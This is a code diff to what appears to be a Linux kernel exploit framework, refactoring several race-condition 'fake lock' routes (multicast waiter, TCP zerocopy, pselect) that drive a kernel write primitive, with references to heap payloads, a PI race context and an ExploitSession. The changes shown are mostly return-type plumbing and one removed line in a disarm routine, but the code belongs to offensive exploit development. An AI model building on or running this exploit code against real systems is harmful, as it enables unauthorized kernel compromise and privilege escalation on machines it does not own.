@@ -214,7 +214,7 @@ void kernel5_resident_stop(void) {
   pr_success("5.x resident writer disarmed\n");
 }
 
-void do_kernel5_fake_lock_route(const WriteRequest *request) {
+RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
   MulticastWaiterRouteContext context;
   multicast_waiter_route_context_init(
       &context, &g_pi_race_context, request, execution_settings(),
@@ -251,6 +251,7 @@ out:
   pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
           context.status.code,context.status.userspace_clean,
           context.status.kernel_disarmed,route_last_step,route_last_errno);
+  return context.status;
 }
 
 /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
@@ -510,7 +511,6 @@ static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
 /* Stop every trigger before releasing any descriptor or mapping. */
 static void tcp_zerocopy_disarm(TcpZerocopyRouteContext *context) {
   atomic_store(&context->race->consumer_go, 0);
-  atomic_store(&context->race->consumer_stop, 1);
   atomic_store(&context->punch_go, 0);
   atomic_store(&context->punch_stop, 1);
   tcp_wait_for_consumer_idle(context);
@@ -560,7 +560,7 @@ static void tcp_zerocopy_destroy(TcpZerocopyRouteContext *context) {
 
 /* Public compatibility entry: lifecycle is now explicitly ordered while the
  * common route dispatcher remains scheduled for S14. */
-void do_tcp_fake_lock_route(const WriteRequest *request) {
+RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
   TcpZerocopyRouteContext context;
   tcp_zerocopy_route_context_init(
       &context, &g_pi_race_context, request, execution_settings(),
@@ -581,6 +581,7 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
           atomic_load(&context.race->consumer_success), context.status.code,
           context.status.userspace_clean, context.status.kernel_disarmed,
           context.status.step, context.status.error_number);
+  return context.status;
 }
 
 /* Decoupling plan: choose route timing delay. Input: attempt and eventually
@@ -958,7 +959,7 @@ static void select_stack_destroy(SelectStackRouteContext *context) {
   }
 }
 
-void do_pselect_fake_lock_route(const WriteRequest *request) {
+RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
   /* TODO(decoupling:S14-select-retry-controller): Compact outer retries must
    * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
    * Keep this route invocation single-shot until ExploitSession can create a
@@ -981,4 +982,5 @@ void do_pselect_fake_lock_route(const WriteRequest *request) {
           context.status.code, context.status.userspace_clean,
           context.status.kernel_disarmed, context.status.step,
           context.status.error_number);
+  return context.status;
 }
